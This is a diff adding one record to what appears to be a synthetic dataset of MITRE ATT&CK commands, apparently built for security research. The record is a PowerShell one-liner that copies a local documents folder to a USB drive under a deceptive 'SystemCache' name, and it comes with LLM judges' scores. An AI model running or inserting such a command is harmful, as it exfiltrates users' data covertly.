@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=((Get-Disk | Where-Object BusType -eq 'USB' | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1).DriveLetter + ':'); New-Item -Path \"$dl\\SystemCache\" -ItemType Directory -Force | Out-Null; Copy-Item -Path \"C:\\Users\\Public\\Documents\\Reports\" -Destination \"$dl\\SystemCache\" -Recurse -Force",
+  "explanation": "Copies a local documents directory to a detected USB drive under a system-sounding folder, writing data to removable media for offline exfiltration.",
+  "rationale_steps": [
+    "Identify a USB disk and resolve its drive letter.",
+    "Create a hidden-looking destination folder on the USB.",
+    "Recursively copy files from the local system to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-12bcaa5a",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command is well-formed overall with balanced quoting and separators, but both uses of 'Where-Object DriveLetter' omit a comparison/operator, which will cause parameter binding errors.",
+        "semantic_score": 4,
+        "semantic_justification": "It appropriately identifies a USB volume and copies a directory to a plausibly obfuscated folder on it (matching T1052), though the Where-Object misuse may prevent successful drive-letter selection at runtime.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:45:24.541357Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignment, correct piping of PowerShell commands, appropriate use of Where-Object filters, and proper string concatenation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 (Exfiltration Over Physical Medium) by automatically detecting a USB drive, creating a deceptively named directory ('SystemCache'), and copying potentially sensitive data ('Reports') to the removable media for physical exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:45:27.901676Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, correct command separators, valid parameter usage, and proper variable assignment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent, effectively detecting a USB drive, creating an obfuscated system-sounding directory, and copying a target data directory to it, directly implementing MITRE ATT&CK T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:45:40.838599Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
